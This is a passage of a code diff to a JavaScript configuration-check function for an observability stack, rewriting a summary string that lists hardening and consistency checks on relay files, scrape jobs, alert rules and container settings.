   if (READ_FILES.size < FILE_FLOOR) {
     failures.push(
@@ -3542,19 +5705,24 @@ export async function observabilityStackConfigEval() {
       `G9c connection_id is no label; G9d read ${membership?.length ?? 0} member(s) positively; ` +
       `G9e clear of movement_tick + ${sloSet.names?.length ?? 0} $slo_set names + ` +
       `${benches.ids?.length ?? 0} bench ids; G9f exact set equality over ${scan.reducersScanned} ` +
-      `reducer bodies in ${Object.keys(srcMap).length} files; G9g the m20e-2 park is intact ` +
-      '(7 services, no relay scrape job, no relay alert rule); G9h no supersession due; ' +
-      `G9i/G9j ${RELAY_PRODUCTION_FILES.length} relay files clean; G9k ` +
-      `${NODE_TEST_FILES.length} suites green (floor ${NODE_TEST_PASS_FLOOR}); G12a the tempo ` +
-      `park is pinned and VISIBLE (command list exact and in order, image tag ` +
-      `${TEMPO_IMAGE_TAG}, no profiles/extends, restart unless-stopped); G12b ` +
-      `${alertingDocs.length} provisioned alerting document(s), every group interval non-zero ` +
-      `and 10s-divisible under ${GRAFANA_IMAGE_TAG} with every \`for:\` an exact multiple of its ` +
-      'own group interval; G12c the Dockerfile final stage strips the caddy net-bind capability ' +
-      'as the last writer of that path, before its single USER; G12d the alloy block declares ' +
-      `only the ${ALLOY_ALLOWED_KEYS.length} allowlisted keys and runs non-root, cap-dropped; ` +
-      "G12e s4_keep's OWN statements list carries the key allowlist at [0] plus all three pinned " +
-      'value bounds, and no compose override file exists',
+      `reducer bodies in ${Object.keys(srcMap).length} files; G9h no supersession due; ` +
+      `G9i/G9j ${RELAY_PRODUCTION_FILES.length} relay production files clean and every relay ` +
+      `.mjs in exactly one of ${RELAY_BAN_TIERS.length} ban tiers (the DAEMON tier's egress ban ` +
+      "is the 13r-c/P5 tripwire); G9n the relay mounts alloy's own replicas path read-only and " +
+      `accepts exactly [${RELAY_COMMAND_FLAGS.join(', ')}] with no entrypoint/env_file/` +
+      'environment; G9o its scrape job resolves inside scrape_configs: on /health at the port ' +
+      "its own compose block binds; G9p its dead-man's switch is distinct from AlloyDown, not " +
+      "paused, and mirrors AlloyDown's threshold, datasource, severity and `for:` — all DERIVED " +
+      `from that rule; G9k ${NODE_TEST_FILES.length} suites green (floor ` +
+      `${NODE_TEST_PASS_FLOOR}); G12a the tempo park is pinned and VISIBLE (command list exact ` +
+      `and in order, image tag ${TEMPO_IMAGE_TAG}, no profiles/extends, restart unless-stopped); ` +
+      `G12b ${alertingDocs.length} provisioned alerting document(s), every group interval ` +
+      `non-zero and 10s-divisible under ${GRAFANA_IMAGE_TAG} with every \`for:\` an exact ` +
+      'multiple of its own group interval; G12c the Dockerfile final stage strips the caddy ' +
+      'net-bind capability as the last writer of that path, before its single USER; G12d the ' +
+      `alloy block declares only the ${ALLOY_ALLOWED_KEYS.length} allowlisted keys and runs ` +
+      "non-root, cap-dropped; G12e s4_keep's OWN statements list carries the key allowlist at " +
+      `[0] plus all three pinned value bounds, and no compose override file exists; ${liveNote}`,
   };
 }
 
